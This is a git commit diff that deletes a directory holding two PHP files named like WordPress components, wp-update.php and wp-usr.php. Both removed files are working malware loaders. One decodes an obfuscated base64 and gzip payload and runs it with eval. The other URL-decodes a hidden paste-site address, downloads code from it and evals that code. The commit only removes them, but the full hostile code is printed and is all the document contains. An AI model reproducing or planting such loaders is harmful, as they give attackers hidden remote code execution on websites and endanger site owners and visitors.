4beb56f2939302b7c3c4477e86664ad9d4ef197c
unamexid <155900225+unamexid@users.noreply.github.com>
2024-07-02 12:27:40 +0630

    Delete x directory

--- x/1/wp-update.php
+++
@@ -1,6 +0,0 @@
-<?php
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "825\x63hDmlW73/O\x61DjSioOH\x63iz52pKshwL\x62LFi868lo2Rsw3UX0sF\x62xfUjYswSNHdOmG/5kr\x62xE7l2tTR\x63z\x6370IzVmyE3dpGZ\x41\x41twUKV\x42r9rjHXLq\x62ZPGj62I\x411Zud/6EQv6Iurfo0N\x43s4WKIJWz/KQ1\x63\x42HJrxEiPZDDoeUt04HwvsswTz/rgD\x62/XrJ\x62n4rfWDVXpl/9\x415S\x61\x42\x63Wl3uz6J\x62X9MG7/78ZHiP1knluY1K3TyIj\x436GoK0v7rqygDdPXo\x61lZkITOup4Qs\x2buOjLEl/KqJVpxQol\x2bGYRrdGXD0pdddz9d/1//XmS9X4\x63Gz427En\x2bW30oQxJ3SJNF64QKi\x43\x61Xk2\x61l6IYqW\x61XYI0HqD9vw3HD\x42MDvUUR2o/5Hg\x42\x42wJe\x2b7e\x41REg/pHgF\x42wJe\x2b7d\x41hEg/ZHgJ\x42wJe\x2b7\x63\x41xEg/JHgN\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
-?>
--- x/wp-usr.php
+++
@@ -1,9 +0,0 @@
-A01<?pHp
-/* AAAAAAAAAAAAAAAAAAA */
-@clearstatcache();
-$XNlsK47az0 = fopen(urldecode('%68%74%74%70%73%3a%2f%2f%70%61%73%74%65%2e%6d%79%63%6f%6e%61%6e%2e%6e%65%74%2f%34%39%37%33%34%37%2e%74%78%74'), 'r');
-$DdJHaBoYl6 = stream_get_contents($XNlsK47az0);
-fclose($XNlsK47az0);
-eval(urldecode('%3f%3e').$DdJHaBoYl6);
-
-?>
